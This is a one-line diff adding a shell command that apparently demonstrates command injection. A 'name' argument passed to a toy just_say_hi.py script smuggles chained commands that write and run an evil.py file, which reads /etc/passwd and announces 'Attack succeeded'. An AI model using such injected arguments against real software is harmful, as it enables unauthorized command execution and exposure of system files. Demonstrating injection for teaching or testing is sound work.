@@ -1,0 +1,1 @@
+python3 just_say_hi.py "Alexey && echo import os > evil.py && echo print\(\'My turn to have fun.\'\) >> evil.py  && echo os.system\(\'cat /etc/passwd\'\) >> evil.py && echo input\(\'Attack succeeded. Just relax and press enter...\'\) >> evil.py&& python3 evil.py"
